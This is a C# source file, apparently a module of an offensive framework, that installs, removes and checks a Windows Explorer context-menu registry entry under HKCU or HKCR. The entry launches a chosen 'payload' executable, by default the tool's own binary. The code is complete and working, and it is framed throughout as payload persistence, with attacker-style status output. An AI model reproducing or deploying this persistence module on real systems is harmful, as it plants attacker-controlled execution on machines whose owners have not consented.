using System;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string DefaultMenuName = "R2-117";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 ctx_menu Start {DefaultMenuName} hkcu-menu {defaultPayload}\n" +
                   $"    (Target hives: 'hkcu-menu' [User], 'hkcr-menu' [Machine])";
        }

        public static string Start(string[] args)
        {
            string menuName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : DefaultMenuName;

            string targetKey = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : "hkcu-menu";

            string payloadPath = (args != null && args.Length > 2 && !string.IsNullOrWhiteSpace(args[2]))
                ? args[2]
                : GetDefaultPayloadPath();

            try
            {
                using var baseKey = OpenForWrite(targetKey, create: true);
                if (baseKey == null)
                    return $"[-] Access denied opening/creating context menu key for '{targetKey}'.";

                using (var existingMenu = baseKey.OpenSubKey(menuName))
                {
                    if (existingMenu != null)
                        return $"[*] Context menu item '{menuName}' already exists under '{targetKey}'.";
                }

                using var menuKey = baseKey.CreateSubKey(menuName);
                if (menuKey == null)
                    return $"[-] Failed to create menu subkey '{menuName}'.";

                menuKey.SetValue("", menuName, RegistryValueKind.String);

                using var commandKey = menuKey.CreateSubKey("command");
                if (commandKey == null)
                    return "[-] Failed to create 'command' execution subkey.";

                commandKey.SetValue("", $"\"{payloadPath}\"", RegistryValueKind.String);

                return $"[+] Successfully Installed context menu '{menuName}' in '{targetKey.ToUpper()}' -> Payload: '\"{payloadPath}\"'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Modifying system context menu paths requires elevated privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during menu installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string menuName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : DefaultMenuName;

            string targetKey = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : "hkcu-menu";

            try
            {
                using var baseKey = OpenForWrite(targetKey, create: false);
                if (baseKey == null)
                    return $"[-] Target registry hive '{targetKey}' not found or inaccessible.";

                using (var existingMenu = baseKey.OpenSubKey(menuName))
                {
                    if (existingMenu == null)
                        return $"[*] Context menu entry '{menuName}' not found in '{targetKey}'.";
                }

                baseKey.DeleteSubKeyTree(menuName);
                return $"[+] Successfully removed context menu entry '{menuName}' from '{targetKey.ToUpper()}'.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Menu removal requires appropriate privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string menuName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : DefaultMenuName;

            string targetKey = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : "hkcu-menu";

            try
            {
                using var baseKey = OpenForRead(targetKey);
                if (baseKey == null)
                    return $"[-] Context menu path for '{targetKey}' not found.";

                using var menuKey = baseKey.OpenSubKey(menuName);
                if (menuKey == null)
                    return $"[*] Context menu entry '{menuName}' not found in '{targetKey.ToUpper()}'.";

                using var commandKey = menuKey.OpenSubKey("command");
                if (commandKey == null)
                    return $"[*] 'command' subkey missing for menu entry '{menuName}'.";

                string commandValue = commandKey.GetValue("")?.ToString();
                if (string.IsNullOrEmpty(commandValue))
                    return $"[*] Execution command value is empty for menu entry '{menuName}'.";

                return $"[+] Verified context menu '{menuName}' in '{targetKey.ToUpper()}' -> Command: '{commandValue}'";
            }
            catch (Exception ex)
            {
                return $"[-] Error during verification: {ex.Message}";
            }
        }

        // ─── Path Resolution Engine ───────────────────────────────────────────────

        private static RegistryKey OpenForWrite(string targetKey, bool create)
        {
            var (hive, path) = ResolvePath(targetKey);
            return create
                ? hive.CreateSubKey(path, writable: true)
                : hive.OpenSubKey(path, writable: true);
        }

        private static RegistryKey OpenForRead(string targetKey)
        {
            var (hive, path) = ResolvePath(targetKey);
            return hive.OpenSubKey(path, writable: false);
        }

        private static (RegistryKey hive, string path) ResolvePath(string targetKey)
        {
            return (targetKey ?? string.Empty).ToLower() switch
            {
                "hkcr-menu" => (Registry.ClassesRoot, @"Directory\Background\shell"),
                "hkcu-menu" => (Registry.CurrentUser, @"Software\Classes\Directory\Background\shell"),
                _           => (Registry.CurrentUser, @"Software\Classes\Directory\Background\shell")
            };
        }
    }
}